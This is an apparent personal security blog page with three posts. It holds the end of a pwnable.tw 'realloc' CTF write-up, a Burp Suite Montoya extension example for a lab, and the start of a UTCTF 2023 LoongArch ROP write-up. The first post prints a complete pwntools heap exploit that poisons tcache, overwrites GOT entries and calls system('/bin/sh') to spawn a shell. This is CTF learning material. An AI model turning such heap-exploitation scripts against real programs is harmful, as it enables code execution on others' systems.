<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">b&quot;victim&quot;</span>)</span><br><span class="line">realloc_free(<span class="number">0</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x18</span>, pack(elf.got[<span class="string">&quot;atoll&quot;</span>]))</span><br><span class="line">free(<span class="number">1</span>)     <span class="comment"># alloc a anonymous 0x20 chunk</span></span><br><span class="line">alloc(<span class="number">1</span>, <span class="number">0x18</span>, pack(elf.plt[<span class="string">&quot;puts&quot;</span>])+pack(<span class="number">0</span>)+pack(<span class="number">0x4015DC</span>))</span><br></pre></td></tr></table></figure>

<p>第一行创建了一个0x20大小区块，第二行将其释放进入tcache，同时保留了这个指针。<br>第三行使用了realloc，realloc发现这个区块大小正常就直接放行了，从而我们可以覆盖fd指针为got[atoll]。<br>第四行使用free的漏洞来申请一个匿名区块，分配完之后再下一个区块就是atoll了。<br>第五行将atoll覆盖为plt[puts]，并顺便把realloc覆盖为一个普通 <code>ret</code> 的地址，原因后面再说。</p>
<p><em>这里需要提一嘴，我使用了匿名区块来解决这一问题：非0的栏位无法进行alloc。不过在复盘时，从网上的大佬那边发现可以通过一种非常巧妙的方式来将栏位置零，同时又不干扰已经位于tcache中的atoll地址，从而将后续利用流程也变得直观一些。<br>可以通过realloc将区块变大，然后再free。这样就可以free到别的大小的tcache中，并且根本不用关注key的检查，也不会将atoll的地址覆盖，一举两得。<br>参考地址见<a target="_blank" rel="noopener" href="https://www.taintedbits.com/2020/07/05/binary-exploitation-pwnable-tw-realloc/">Binary Exploitation [pwnable.tw] - Realloc - Tainted Bits</a></em></p>
<p>接下来泄露libc地址，由于buffer+8就有，因此简简单单就可以泄露了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1111111\n&quot;</span>)   <span class="comment"># just padding</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;1111111\n&quot;</span>)</span><br><span class="line">libc_base = unpack(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x1e570a</span></span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>

<h3 id="攻击！"><a href="#攻击！" class="headerlink" title="攻击！"></a>攻击！</h3><p>目标是 get shell，由于之前已经有了指向GOT的指针（栏位1中），所以我们想办法利用realloc中最后的那个read_input函数来再次修改GOT。<br>但由于realloc在中间会调用realloc（废话），直接让他realloc一个GOT中的区块大概率是要出问题的，而且程序会往realloc的返回值中读入数据。因此我们需要想一个办法让realloc调用返回之后，rax是GOT中区块的地址。</p>
<p>静态分析一波，并没有发现什么 <code>mov rax, rdi; ret;</code> 的gadget，难道我的方法走不下去了吗？于是动态分析一波，惊喜地发现 <strong>程序在调用realloc之前，rax中就已经是GOT中区块地地址了</strong>，令人不得不感叹 <del>大自然</del> 出题人的鬼斧神工。</p>
<p>所以就有了上面把realloc覆盖为一个简单的 <code>ret</code> 。这样一来，在执行了下面几句代码后，atoll就会变成system的地址（<strong>注意注释</strong>，很重要）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;\0&#x27;</span>)          <span class="comment"># now atoll is puts, so puts(&quot;\0&quot;) = 1</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1111111\0&quot;</span>)   <span class="comment"># now atoll is puts, so puts(&quot;1111111\0&quot;) = 8</span></span><br><span class="line"><span class="comment"># we have hijacked realloc to &#x27;ret&#x27;, and when call realloc, rax has been same as rdi (which is really coincident)</span></span><br><span class="line"><span class="comment"># so program just pass and execute read_input(heap[v1], size)</span></span><br><span class="line">io.sendline(pack(libc_base+libc.symbols[<span class="string">&quot;system&quot;</span>]))</span><br></pre></td></tr></table></figure>

<p>最后，我们随便触发一个read_long，输入&#x2F;bin&#x2F;sh，就可以成功 get shell！当然，也可以直接输入 <code>cat ~/flag</code>，如果您需要节省时间的话。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;/bin/sh\0&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="完整脚本"><a href="#完整脚本" class="headerlink" title="完整脚本"></a>完整脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params"><span class="built_in">id</span>, size, data</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Data:&quot;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">realloc</span>(<span class="params"><span class="built_in">id</span>, size, data</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Data:&quot;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">realloc_free</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>).encode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ---------- leak libc ----------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1.1 hijack GOT[atoll] to PLT[puts], GOT[realloc] to &#x27;ret&#x27;</span></span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">b&quot;victim&quot;</span>)</span><br><span class="line">    realloc_free(<span class="number">0</span>)</span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0x18</span>, pack(elf.got[<span class="string">&quot;atoll&quot;</span>]))</span><br><span class="line">    free(<span class="number">1</span>)     <span class="comment"># alloc a anonymous 0x20 chunk</span></span><br><span class="line">    alloc(<span class="number">1</span>, <span class="number">0x18</span>, pack(elf.plt[<span class="string">&quot;puts&quot;</span>])+pack(<span class="number">0</span>)+pack(<span class="number">0x4015DC</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1.2 leak libc load address (from stack)</span></span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1111111\n&quot;</span>)   <span class="comment"># just padding</span></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;1111111\n&quot;</span>)</span><br><span class="line">    libc_base = unpack(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x1e570a</span></span><br><span class="line">    success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ---------- hijack GOT ----------</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.1 hijack GOT[atoi] to libc[system]</span></span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;\0&#x27;</span>)          <span class="comment"># now atoll is puts, so puts(&quot;\0&quot;) = 1</span></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1111111\0&quot;</span>)   <span class="comment"># now atoll is puts, so puts(&quot;1111111\0&quot;) = 8</span></span><br><span class="line">    <span class="comment"># we have hijacked realloc to &#x27;ret&#x27;, and when call realloc, rax has been same as rdi (which is really coincident)</span></span><br><span class="line">    <span class="comment"># so program just pass and execute read_input(heap[v1], size)</span></span><br><span class="line">    io.sendline(pack(libc_base+libc.symbols[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2.2 trigger system(&quot;/bin/sh&quot;) by atoi(&quot;/bin/sh&quot;)</span></span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    success(<span class="string">&quot;Enjoy your shell!&quot;</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>这个故事告诉我们：涉及内存安全的函数还是要小心小心再小心，仔细阅读手册、了解边界行为……</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/PoRE/d5088fb7cb3c.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/PoRE/d5088fb7cb3c.html" class="post-title-link" itemprop="url">【PoRE#0x03】Burp Extension</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-04-11 21:58:41" itemprop="dateCreated datePublished" datetime="2023-04-11T21:58:41+08:00">2023-04-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:34:30" itemprop="dateModified" datetime="2024-01-11T16:34:30+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/PoRE/" itemprop="url" rel="index"><span itemprop="name">PoRE</span></a>
                </span>
            </span>

          
            <span id="/Tech/PoRE/d5088fb7cb3c.html" class="post-meta-item leancloud_visitors" data-flag-title="【PoRE#0x03】Burp Extension" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/PoRE/d5088fb7cb3c.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/PoRE/d5088fb7cb3c.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>官方教程：<a target="_blank" rel="noopener" href="https://portswigger.net/burp/documentation/desktop/extensions/creating">Creating Burp extensions - PortSwigger</a><br>Montoya官方文档：<a target="_blank" rel="noopener" href="https://portswigger.github.io/burp-extensions-montoya-api/javadoc/burp/api/montoya/MontoyaApi.html">MontoyaApi</a><br>Montoya官方示例：<a target="_blank" rel="noopener" href="https://github.com/PortSwigger/burp-extensions-montoya-api-examples">PortSwigger&#x2F;burp-extensions-montoya-api-examples: Examples for using the Montoya API with Burp Suite</a></p>
<p>Burp Suite过去插件开发使用的是Extender API，不过最近推出了一套新的API（今年1月刚刚发布），叫做Montoya API。新的API增加了Burp Suite插件开发的简便性，但是似乎并不完善，还有一些接口没有实现的样子。</p>
<p>对于Lab4中的任务，也就是自动处理HTTP包的插件，可以参考这个例子：<a target="_blank" rel="noopener" href="https://github.com/PortSwigger/burp-extensions-montoya-api-examples/tree/main/proxyhandler/src/main/java/example/proxyhandler">burp-extensions-montoya-api-examples&#x2F;proxyhandler&#x2F;src&#x2F;main&#x2F;java&#x2F;example&#x2F;proxyhandler at main · PortSwigger&#x2F;burp-extensions-montoya-api-examples</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Ext</span> <span class="keyword">implements</span> <span class="title class_">BurpExtension</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initialize</span><span class="params">(MontoyaApi api)</span> &#123;</span><br><span class="line">        api.extension().setName(<span class="string">&quot;Lab4_Extension&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Logging</span> <span class="variable">logging</span> <span class="operator">=</span> api.logging();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write a message to our output stream</span></span><br><span class="line">        logging.logToOutput(<span class="string">&quot;Hello output.&quot;</span>);</span><br><span class="line"></span><br><span class="line">        api.proxy().registerRequestHandler(<span class="keyword">new</span> <span class="title class_">RequestHandler</span>(logging));</span><br><span class="line">        logging.logToOutput(<span class="string">&quot;Bind RequestHandler&quot;</span>);</span><br><span class="line">        api.proxy().registerResponseHandler(<span class="keyword">new</span> <span class="title class_">RespondHandler</span>(logging));</span><br><span class="line">        logging.logToOutput(<span class="string">&quot;Bind RespondHandler&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestHandler</span> <span class="keyword">implements</span> <span class="title class_">ProxyRequestHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Logging logging;</span><br><span class="line">    RequestHandler(Logging logging) &#123;</span><br><span class="line">        <span class="built_in">this</span>.logging = logging;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ProxyRequestReceivedAction <span class="title function_">handleRequestReceived</span><span class="params">(InterceptedRequest interceptedRequest)</span> &#123;</span><br><span class="line"></span><br><span class="line">        logging.logToOutput(<span class="string">&quot;Request&quot;</span>);</span><br><span class="line">        logging.logToOutput(<span class="string">&quot;url &quot;</span> + interceptedRequest.url());</span><br><span class="line">        logging.logToOutput(<span class="string">&quot;request &quot;</span> + interceptedRequest.bodyToString());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// modify the request</span></span><br><span class="line">        <span class="type">HttpRequest</span> <span class="variable">new_request</span> <span class="operator">=</span> interceptedRequest;</span><br><span class="line">        <span class="keyword">if</span> (interceptedRequest.url().contains(<span class="string">&quot;login&quot;</span>)) &#123;</span><br><span class="line">            logging.logToOutput(<span class="string">&quot;Login detected&quot;</span>);</span><br><span class="line">            new_request = interceptedRequest.withBody(<span class="string">&quot;msg=...&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (interceptedRequest.url().contains(<span class="string">&quot;buy&quot;</span>)) &#123;</span><br><span class="line">            logging.logToOutput(<span class="string">&quot;Buy detected&quot;</span>);</span><br><span class="line">            new_request = interceptedRequest.withBody(<span class="string">&quot;msg=...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ProxyRequestReceivedAction.continueWith(new_request);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ProxyRequestToBeSentAction <span class="title function_">handleRequestToBeSent</span><span class="params">(InterceptedRequest interceptedRequest)</span> &#123;</span><br><span class="line">        <span class="comment">//Do nothing with the user modified request, continue as normal.</span></span><br><span class="line">        <span class="keyword">return</span> ProxyRequestToBeSentAction.continueWith(interceptedRequest);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RespondHandler</span> <span class="keyword">implements</span> <span class="title class_">ProxyResponseHandler</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Logging logging;</span><br><span class="line">    RespondHandler(Logging logging) &#123;</span><br><span class="line">        <span class="built_in">this</span>.logging = logging;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ProxyResponseReceivedAction <span class="title function_">handleResponseReceived</span><span class="params">(InterceptedResponse interceptedResponse)</span> &#123;</span><br><span class="line">        logging.logToOutput(<span class="string">&quot;Response&quot;</span>);</span><br><span class="line">        logging.logToOutput(<span class="string">&quot;response &quot;</span> + interceptedResponse.bodyToString());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// modify the response</span></span><br><span class="line">        <span class="keyword">if</span> (interceptedResponse.bodyToString().equals(<span class="string">&quot;...&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> ProxyResponseReceivedAction.continueWith(interceptedResponse.withBody(<span class="string">&quot;...&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ProxyResponseReceivedAction.continueWith(interceptedResponse);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> ProxyResponseToBeSentAction <span class="title function_">handleResponseToBeSent</span><span class="params">(InterceptedResponse interceptedResponse)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> ProxyResponseToBeSentAction.continueWith(interceptedResponse);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://www.cameudis.com/Tech/Pwn/141743759f16.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/ava1.jpg">
      <meta itemprop="name" content="Cameudis">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Cameudis' Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/Tech/Pwn/141743759f16.html" class="post-title-link" itemprop="url">【Pwn#0x0F】UTCTF 2023 Bing Chilling</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-04-04 13:19:34" itemprop="dateCreated datePublished" datetime="2023-04-04T13:19:34+08:00">2023-04-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2024-01-11 16:30:39" itemprop="dateModified" datetime="2024-01-11T16:30:39+08:00">2024-01-11</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/" itemprop="url" rel="index"><span itemprop="name">Tech</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Tech/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
                </span>
            </span>

          
            <span id="/Tech/Pwn/141743759f16.html" class="post-meta-item leancloud_visitors" data-flag-title="【Pwn#0x0F】UTCTF 2023 Bing Chilling" title="Views">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine: </span>
    
    <a title="valine" href="/Tech/Pwn/141743759f16.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/Tech/Pwn/141743759f16.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Loongarch ROP<br>比赛时发现了这是LoongArch的ROP，然后不太会找gadget就放弃了。赛后看大佬的writeup，发现只要找到一个关键的来自_dl_runtime_resolve的gadget，就可以万事大吉了。<br>复现参考：<a target="_blank" rel="noopener" href="https://ctftime.org/writeup/36285">CTFtime.org &#x2F; UTCTF 2023 &#x2F; Bing Chilling &#x2F; Writeup</a></p>
<hr>
<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>我们都知道 Linux 下的可执行文件是 ELF 格式，但 ELF 也分架构，比如这个 binary 就并不是 amd64 架构的，而是 Loongarch 龙架构。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file hello</span><br><span class="line">hello: ELF 64-bit LSB executable, *unknown <span class="built_in">arch</span> 0x102* version 1 (SYSV), statically linked, <span class="keyword">for</span> GNU/Linux 5.19.0, with debug_info, not stripped</span><br></pre></td></tr></table></figure>

<p>可以看到其 ELF Header 中的 arch 字段值为 0x102，是一个 file 未知的架构。在网上查询 0x102，可以知道这是龙架构。为了调试这个 binary，我们需要一台龙架构真机……或者是一个龙芯模拟器。此外，我们还需要能够静态分析这个 binary 的工具，比如 objdump。</p>
